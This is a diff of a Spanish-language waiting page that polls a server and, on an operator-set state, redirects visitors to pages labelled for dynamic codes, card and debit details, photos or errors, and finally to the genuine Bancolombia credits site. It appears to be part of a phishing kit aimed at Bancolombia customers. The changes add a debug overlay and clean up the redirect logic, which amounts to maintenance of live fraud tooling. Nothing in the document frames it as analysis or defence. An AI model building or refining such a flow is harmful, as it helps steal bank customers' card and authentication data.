@@ -10,21 +10,24 @@
   <meta http-equiv="Last-Modified" content="0">
 
   <style>
+    * { box-sizing: border-box; }
     body {
       margin: 0;
-      padding: 0;
+      padding: 0 0 200px 0;
       font-family: Arial, sans-serif;
-      background-color: #fff;
+      background-color: #f7f7f7;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       text-align: center;
+      position: relative;
     }
 
     .contenedor {
       position: relative;
       width: 80%;
       max-width: 400px;
+      margin: 0 auto;
     }
 
     .gif-overlay {
@@ -49,6 +52,45 @@
       padding: 8px 16px;
       border-radius: 10px;
     }
+
+    #debugOverlay {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      max-height: 200px;
+      overflow-y: auto;
+      background: rgba(0,0,0,0.82);
+      color: #fff;
+      font-family: Consolas, Menlo, monospace;
+      font-size: 11px;
+      text-align: left;
+      padding: 8px 10px;
+      z-index: 999999;
+      border-top: 2px solid #f5c518;
+    }
+    #debugOverlay h4 {
+      margin: 0 0 4px 0;
+      padding: 0;
+      font-size: 12px;
+      color: #f5c518;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    #debugOverlay h4 button {
+      border: 0;
+      background: #f5c518;
+      color: #222;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 10px;
+      cursor: pointer;
+    }
+    #debugOverlay .pollLine { white-space: nowrap; }
+    #debugOverlay .pendiente  { color: #9bdcff; }
+    #debugOverlay .candidato  { color: #ffd37a; }
+    #debugOverlay .confirmado { color: #5aff8a; font-weight: bold; }
+    #debugOverlay .redirect   { color: #ff6a6a; font-weight: bold; }
+    #debugOverlay .info       { color: #dcdcdc; }
   </style>
 </head>
 <body style="background-color:#f7f7f7; background-repeat: no-repeat; background-size: 300%;">
@@ -59,6 +101,14 @@
   <img style="margin-top: -150px;" src="img/cargando1.gif" width="85%" alt="">
 </center>
 
+<div id="debugOverlay">
+  <h4>
+    <span>🔍 ESTADO POLLING (visible debug)</span>
+    <button onclick="document.getElementById('debugOverlay').style.display='none';">OCULTAR</button>
+  </h4>
+  <div id="debugLog"></div>
+</div>
+
 <script>
   const params = new URLSearchParams(window.location.search);
   const requestId = params.get("rid");
@@ -66,8 +116,58 @@
 
   let estadoAnterior = null;
   let coincidenciasSeguidas = 0;
+  let redirectPendiente = null;
+
+  const logEl = document.getElementById('debugLog');
+  function addLine(text, cls = 'info') {
+    const div = document.createElement('div');
+    div.className = 'pollLine ' + cls;
+    const ts = new Date().toLocaleTimeString('es-CO', {hour12: false});
+    div.textContent = `[${ts}] ${text}`;
+    logEl.insertBefore(div, logEl.firstChild);
+    while (logEl.childElementCount > 40) logEl.removeChild(logEl.lastChild);
+    // eslint-disable-next-line no-console
+    console.log(`[espera] ${div.textContent}`);
+  }
+
+  addLine(`rid=${requestId || '(null)'}  key=${key || '(null)'}`);
+
+  const mapDestino = {
+    'opcion_1':  'opcion1.html (DINAMICA)',
+    'opcion_2':  'opcion6.html (TARJETA)',
+    'opcion_3':  'opcion3.html (ERROR_3)',
+    'opcion_4':  'opcion4.html (ERROR_4)',
+    'opcion_5':  'opcion5.html (FOTO)',
+    'opcion_6':  'opcion6.html (DEBITO)',
+    'opcion_7':  'opcion7.html',
+    'opcion_8':  'opcion8.html',
+    'opcion_55': 'opcion55.html',
+    'opcion_9':  'opcion9.php (ERROR DINAMICA)',
+    'opcion_10': 'https://www.bancolombia.com/personas/creditos (FINALIZAR)',
+  };
+
+  function urlPara(estado) {
+    switch (estado) {
+      case 'opcion_1':  return `opcion1.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
+      case 'opcion_2':
+      case 'opcion_6':  return `opcion6.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_3':  return `opcion3.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_4':  return `opcion4.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_5':  return `opcion5.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_7':  return `opcion7.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_8':  return `opcion8.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_55': return `opcion55.html?key=${encodeURIComponent(key)}`;
+      case 'opcion_9':  return `opcion9.php?key=${encodeURIComponent(key)}`;
+      case 'opcion_10': return 'https://www.bancolombia.com/personas/creditos';
+      default: return null;
+    }
+  }
+
+  // Bloquear doble redireccion (por si 2 intervalos corren a la vez)
+  let yaRedirigiendo = false;
 
   setInterval(() => {
+    if (yaRedirigiendo) return;
     fetch(
       `estado.php?rid=${encodeURIComponent(requestId)}` +
       (key ? (`&key=${encodeURIComponent(key)}`) : ''),
@@ -76,73 +176,47 @@
       .then(res => res.ok ? res.json() : Promise.reject('HTTP '+res.status))
       .then(data => {
         const estado = (data && typeof data.estado === 'string') ? data.estado : 'pendiente';
-        const ahora = new Date().toISOString();
-        // Log de auditoria visible en DevTools del navegador para el usuario
-        // eslint-disable-next-line no-console
-        console.log(`[espera] ${ahora} rid=${requestId || ''} key=${key || ''} => estado=${estado} (previo=${estadoAnterior || 'null'})`);
 
         if (estado === 'pendiente') {
+          addLine(`estado=pendiente  (coincidenciasSeguidas reiniciadas)`, 'pendiente');
           estadoAnterior = 'pendiente';
           coincidenciasSeguidas = 0;
+          redirectPendiente = null;
           return;
         }
 
-        // Confirmacion DOBLE: dos polls consecutivos (4s) con el MISMO estado
-        // antes de redirigir. Evita respuestas de red glitches.
+        // Estado distinto de pendiente
+        const destino = mapDestino[estado] || estado;
         if (estadoAnterior && estadoAnterior === estado) {
           coincidenciasSeguidas += 1;
+          addLine(`estado=${estado} (x${coincidenciasSeguidas}) => destino=${destino}`,
+            coincidenciasSeguidas >= 2 ? 'confirmado' : 'candidato');
         } else {
           estadoAnterior = estado;
           coincidenciasSeguidas = 1;
+          addLine(`estado=${estado} NUEVO (x1) => destino=${destino}`, 'candidato');
         }
 
-        if (coincidenciasSeguidas >= 2) {
-          // eslint-disable-next-line no-console
-          console.log(`[espera] ${ahora} ✅ estado confirmado x2 = ${estado}. Redirigiendo...`);
-          switch (estado) {
-            case 'opcion_1':
-              window.location.href = `opcion1.html?key=${encodeURIComponent(key)}&requestId=${encodeURIComponent(requestId)}`;
-              break;
-            case 'opcion_2':
-              window.location.href = `opcion6.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_3':
-              window.location.href = `opcion3.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_4':
-              window.location.href = `opcion4.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_5':
-              window.location.href = `opcion5.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_6':
-              window.location.href = `opcion6.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_7':
-              window.location.href = `opcion7.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_8':
-              window.location.href = `opcion8.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_55':
-              window.location.href = `opcion55.html?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_9':
-              window.location.href = `opcion9.php?key=${encodeURIComponent(key)}`;
-              break;
-            case 'opcion_10':
-              window.location.href = 'https://www.bancolombia.com/personas/creditos';
-              break;
-            default:
-              // Ninguna accion para estados desconocidos.
-              break;
+        if (coincidenciasSeguidas >= 2 && !yaRedirigiendo) {
+          const urlGo = urlPara(estado);
+          if (urlGo) {
+            yaRedirigiendo = true;
+            addLine(`✅ 2 VECES SEGUIDAS ${estado} => REDIRIGIENDO A: ${urlGo}`, 'redirect');
+            // eslint-disable-next-line no-console
+            console.log(`[espera] ✅ estado confirmado x2 = ${estado}. Redirigiendo a ${urlGo}`);
+            setTimeout(() => {
+              window.location.href = urlGo;
+            }, 1200); // 1.2s para que alcances a leer el overlay antes del salto
+          } else {
+            addLine(`Estado ${estado} no mapeado para navegacion (se ignora).`, 'info');
           }
         }
       })
-      .catch(() => {
-        // Ignore network/json errors; keep polling.
+      .catch(err => {
+        addLine(`error polling: ${err || 'network'} (reinicia contador)`, 'info');
         estadoAnterior = null;
         coincidenciasSeguidas = 0;
+        redirectPendiente = null;
       });
   }, 2000);
 </script>
